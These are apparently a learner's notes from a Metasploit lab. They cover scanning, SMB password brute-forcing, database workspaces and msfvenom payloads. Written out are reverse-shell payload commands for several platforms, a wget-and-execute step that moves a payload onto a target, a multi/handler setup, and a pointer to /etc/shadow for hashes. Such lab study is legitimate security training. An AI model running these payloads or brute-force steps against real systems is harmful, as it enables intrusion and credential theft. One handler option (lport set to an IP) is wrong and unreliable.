# Metasploit: Exploitation

Scanning, vulnerability assessment and exploitation

[ metasploit v5.0.101-dev]
[ 2048 exploits - 1105 auxiliary - 344 post]
[ 562 payloads - 45 encoders - 10 nops]
[ 7 evasion]

## Start Metasploit

`msfconsole` to run Metasploit

## Modules

### search \ show :

`search <module_name>` or `show <module_name>` or `show options`

for example: `search portscan`, `search udp`, `show auxilary`, `show exploits`

### use :

`use <module_name>`

### Info

After entering into a module you can get useful information by using `info`

### Payload

After entering into a module you can get information about different payloads by using `show payloads` and the set a payload with `set payload`

Note that choosing a working payload could become a trial and error process due to environmental or OS restrictions such as firewall rules, anti-virus, file writing, or the program performing the payload execution isn't available (eg. payload/python/shell_reverse_tcp).

## Exploitation

Note: To answer all the questions it requires to use a wordlist (e.g brute-force attacks)

### Port scanning

**Options**:

- CONCURRENCY: Number of targets to be scanned simultaneously.

- PORTS: Port range to be scanned. Please note that 1-1000 here will not be the same as using Nmap with the default configuration. Nmap will scan the 1000 most used ports, while Metasploit will scan port numbers from 1 to 10000.

- RHOSTS: Target or target network to be scanned.

- THREADS: Number of threads that will be used simultaneously. More threads will result in faster scans.

Nmap scans can be performed directly on msfconsole prompt. For example:

```shell
msf6> nmap -sS <target_IP>
```

### UDP service Identification

This module `scanner/discovery/udp_sweep` allow you to quickly (not extensive scan) identify services running over the UDP (DNS, NetBIOS, ...)

1. `use scanner/discovery/udp_sweep`
2. `run <target_IP>`

It reveals that there is a NetBIOS service on the target, then:

1. `use auxiliary/scanner/netbios/nbname`
2. `set RHOSTS <target_IP>`

To check what is running on a specific prot:

1. `back` to go back to msf6 prompt
2. `use auxiliary/scanner/http/http_version`
3. `set RHOSTS <target_IP>`
4. `run` or `exploit`

or

1. `back`
2. `nmap -p 8000 -sV <target_IP>`

### SMB

The useful modules for corporate network would be `smb_enumshares` and `smb_version`

To find a password of SMB for a specific user:

1. `use auxiliary/scanner/smb/smb_login`
2. `set SMBUser <username>`
3. `set PASS_FILE <wordlist_file>`
4. `set RHOSTS <target_IP>`
5. `run`

## Database

The database feature will allow you to create workspaces to isolate different projects.

### Delete database

To deelete the existing database `sudo -u postgres msfdb delete`

### Initialize database

To store data rrelated to your penetration testing engagements, such as hosts, sevices, and vulnerabilities you need to initialize the Metasploit Framework's database. This allows for better organization and management of your testing activities, enabling features like reporting, session management, and persistence.

You will first need to start the PostgreSQL database using `systemctl start postgresql`.

Then if you are a root user `sudo -u postgres msfdb init` or `msfdb init` if you are a non-root user.

### Database status

To check the database status firt enter the framework `msfconsole` then `db_status`.

## Workspaces

The database feature will allow you to create workspaces to isolate different projects.

### List workspaces

To list available workspaces use the `workspace` command.

### Add a workspace

To add workspace you can use `workspace -a <workspace_name>`

### Select a workspace

To select a workspace you can use `workspace <workspace_name>`

## MSF using database

To save nmap results into the database `db_nmap -sV -p- <target_IP>`

To retrieve the information on the target system use `hosts` and `services` or `services -S <specific_service_name>`

The saved IP addresses can be used as RHOSTS for any module upon entering into the module and using the `host -R` command.

## Vulnerability scanning

Search the right module, use the module, set the proper options to find the right vulnerability.

Examples are `auxiliary/scanner/vnc/vnc_login`

## Exploits

### Interesting services to exploit

You may want to look for low-hanging fruits (critical vulnerabilities) such as:

**HTTP**: Could potentially host a web application where you can find vulnerabilities like SQL injection or Remote Code Execution (RCE).
**FTP**: Could allow anonymous login and provide access to interesting files.
**SMB**: Could be vulnerable to SMB exploits like MS17-010
**SSH**: Could have default or easy to guess credentials
**RDP**: Could be vulnerable to Bluekeep or allow desktop access if weak credentials were used.

**Options for exploitation:**

**RHOSTS** stands for Remote Host, which is the IP address of the target system you are trying to exploit.

**LHOST** stands for Local Host, which is the IP address on your attack machine that will receive the reverse shell or connection from the target after successful exploit.

Once a session (reverse shell) is opened, you can background it using CTRL+Z or abort it using CTRL+C. Backgrounding a session will be useful when working on more than one target simultaneously or on the same target with a different exploit and/or shell.

## MSFVENOM

Msfvenom, which replaced Msfpayload and Msfencode, allows you to generate payloads. Msfvenom will allow you to access all payloads available in the Metasploit framework. Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.) and obtain a Meterpreter session on the target system.

### Output formats

You can either generate stand-alone payloads (e.g. a Windows executable for Meterpreter) or get a usable raw format (e.g. python). The `msfvenom --list formats` command can be used to list supported output formats

### Encoders

Contrary to some beliefs, encoders do not aim to bypass antivirus installed on the target system. As the name suggests, they encode the payload. While it can be effective against some antivirus software, using modern obfuscation techniques or learning methods to inject shellcode is a better solution to the problem. The example below shows the usage of encoding (with the `-e` parameter. The PHP version of Meterpreter was encoded in Base64, and the output format was raw.

`msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64`

### Handlers

Similar to exploits using a reverse shell, you will need to be able to accept incoming connections generated by the MSFvenom payload. When using an exploit module, this part is automatically handled by the exploit module, you will remember how the payload options title appeared when setting a reverse shell. The term commonly used to receive a connection from a target is 'catching a shell'. Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler.

The following scenario may be familiar; we will exploit the file upload vulnerability present in DVWA (Damn Vulnerable Web Application). For the exercises in this task, you will need to replicate a similar scenario on another target system, DVWA was used here for illustration purposes. The exploit steps are;

Generate the PHP shell using MSFvenom
Start the Metasploit handler
Execute the PHP shell
MSFvenom will require a payload, the local machine IP address, and the local port to which the payload will connect. Seen below, 10.0.2.19 is the IP address of the AttackBox used in the attack and local port 7777 was chosen.

`msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
`

Please note: The output PHP file will miss the starting PHP tag `<?php` commented and the end tag (?>).

### Other Payloads

Based on the target system's configuration (operating system, install webserver, installed interpreter, etc.), msfvenom can be used to create payloads in almost all formats. Below are a few examples you will often use:

**Linux Executable and Linkable Format (elf)**
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f elf > rev_shell.elf`

**Windows**
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f exe > rev_shell.exe`

**PHP**
`msfvenom -p php/meterpreter_reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f raw > rev_shell.php`

**ASP**
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f asp > rev_shell.asp`

**Python**
`msfvenom -p cmd/unix/reverse_python LHOST=<attacker_ip> LPORT=<attacker_port> -f raw > rev_shell.py`

You can download the rev_shell payload on the target machine by starting a server on attackers machine using `python3 -m http.server 9000` then on the target machine download the file using `wget http://ATTACKING_MACHINE_IP:9000/rev_shell.elf` before executing this file on the machine you need to give executable permission using `chmod +x rev_shell.elf`.

The hashdump of the user's password in linux is location in `/etc/shadow` file.

To finish the tasks you have to follow 3 steps:

1. Create the rev_shell payload with specific language and machine type using msfvenom
2. Send the file to the target machine and excute it.
3. Start the specific exploit module on attacking machine in msf and run it. For linux machine: `use exploit/multi/handler` then `set payload linux/x86/meterpreter/reverse_tcp` then `set lhost=<attacker_ip>` then `set lport=<attacker_ip>` and then `run` (the target machine should be executing the payload created in step 1 to maintain a session between attacker and target machine)
